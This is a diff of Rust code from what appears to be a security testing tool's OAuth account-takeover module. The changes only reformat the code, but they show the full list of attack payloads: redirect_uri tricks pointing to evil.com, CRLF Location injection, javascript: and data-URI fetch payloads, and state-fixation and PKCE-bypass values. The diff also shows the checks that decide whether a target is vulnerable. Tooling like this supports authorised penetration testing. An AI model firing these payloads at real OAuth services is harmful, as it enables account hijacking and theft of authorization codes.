@@ -269,21 +269,45 @@ pub async fn scope(
 
 const ATO_REDIRECT_PAYLOADS: &[(&str, &str)] = &[
     ("Open redirect via path", "https://evil.com/redirect"),
-    ("Redirect via subdomain", "https://target.com.evil.com/callback"),
+    (
+        "Redirect via subdomain",
+        "https://target.com.evil.com/callback",
+    ),
     ("Redirect via @", "https://target.com@evil.com/callback"),
     ("Redirect via #", "https://target.com#evil.com"),
     ("Redirect via \\", "https://target.com\\@evil.com"),
     ("Redirect via //", "https://target.com//evil.com"),
-    ("Redirect via path traversal", "https://target.com/../evil.com"),
+    (
+        "Redirect via path traversal",
+        "https://target.com/../evil.com",
+    ),
     ("Redirect via encoded @", "https://target.com%40evil.com"),
     ("Redirect via encoded /", "https://target.com%2Fevil.com"),
-    ("Redirect via double encoded", "https://target.com%252F..%252Fevil.com"),
-    ("Redirect via CR", "https://target.com\r\nLocation: https://evil.com"),
-    ("Redirect via LF", "https://target.com\nLocation: https://evil.com"),
+    (
+        "Redirect via double encoded",
+        "https://target.com%252F..%252Fevil.com",
+    ),
+    (
+        "Redirect via CR",
+        "https://target.com\r\nLocation: https://evil.com",
+    ),
+    (
+        "Redirect via LF",
+        "https://target.com\nLocation: https://evil.com",
+    ),
     ("Redirect via null byte", "https://target.com\x00.evil.com"),
-    ("Redirect via authority", "https://evil.com:80@target.com/callback"),
-    ("Redirect via data URI", "data:text/html,<script>fetch('https://evil.com')</script>"),
-    ("Redirect via javascript", "javascript:fetch('https://evil.com')"),
+    (
+        "Redirect via authority",
+        "https://evil.com:80@target.com/callback",
+    ),
+    (
+        "Redirect via data URI",
+        "data:text/html,<script>fetch('https://evil.com')</script>",
+    ),
+    (
+        "Redirect via javascript",
+        "javascript:fetch('https://evil.com')",
+    ),
     ("State fixation — empty", ""),
     ("State fixation — known", "fixed_state_12345"),
     ("PKCE bypass — plain", "plain"),
@@ -296,7 +320,11 @@ pub async fn ato(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::R
     println!("{} OAuth Account Takeover Suite", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} Auth URL: {}", "[*]".cyan().bold(), auth_url);
-    println!("{} {} ATO payloads", "[*]".cyan().bold(), ATO_REDIRECT_PAYLOADS.len());
+    println!(
+        "{} {} ATO payloads",
+        "[*]".cyan().bold(),
+        ATO_REDIRECT_PAYLOADS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -336,8 +364,14 @@ pub async fn ato(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::R
                 let vulnerable = redirects_to_evil
                     || body.contains("evil.com")
                     || (status == 302 && location.contains("code=") && !location.contains("error"))
-                    || (name.contains("State") && status == 302 && (location.contains("code=") || location.contains("state=")) && !location.contains("error"))
-                    || (name.contains("PKCE") && status == 302 && (location.contains("code=") || location.contains("code_challenge=")) && !location.contains("error"));
+                    || (name.contains("State")
+                        && status == 302
+                        && (location.contains("code=") || location.contains("state="))
+                        && !location.contains("error"))
+                    || (name.contains("PKCE")
+                        && status == 302
+                        && (location.contains("code=") || location.contains("code_challenge="))
+                        && !location.contains("error"));
 
                 let tag = if vulnerable {
                     "VULNERABLE".red().bold().to_string()
@@ -366,7 +400,12 @@ pub async fn ato(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::R
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:35} error", "*".red(), results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:35} error",
+                    "*".red(),
+                    results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -384,13 +423,22 @@ pub async fn ato(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::R
         let has_pkce = results.iter().any(|n| n.contains("PKCE"));
 
         if has_redirect {
-            println!("{} [CRITICAL] redirect_uri manipulation — full account takeover!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] redirect_uri manipulation — full account takeover!",
+                "[!]".red().bold()
+            );
         }
         if has_state {
-            println!("{} [HIGH] State fixation — CSRF protection bypass possible!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] State fixation — CSRF protection bypass possible!",
+                "[!]".red().bold()
+            );
         }
         if has_pkce {
-            println!("{} [HIGH] PKCE bypass — authorization code interception!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] PKCE bypass — authorization code interception!",
+                "[!]".red().bold()
+            );
         }
     } else {
         println!("{} No ATO vulnerabilities detected.", "[-]".green().bold());
